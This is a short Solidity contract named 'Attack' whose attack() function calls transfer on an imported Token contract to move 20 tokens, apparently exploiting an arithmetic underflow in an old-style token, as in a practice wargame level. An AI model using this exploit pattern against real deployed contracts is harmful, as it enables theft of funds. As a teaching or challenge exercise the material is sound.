pragma solidity ^0.6.0;

import "./token.sol";

contract Attack {

    Token token;

    address public owner;

    constructor(address _address) public {
        token = Token(_address);
        owner = msg.sender;
    }

    function attack(address _address) public {
        token.transfer(_address, 20);
    }
}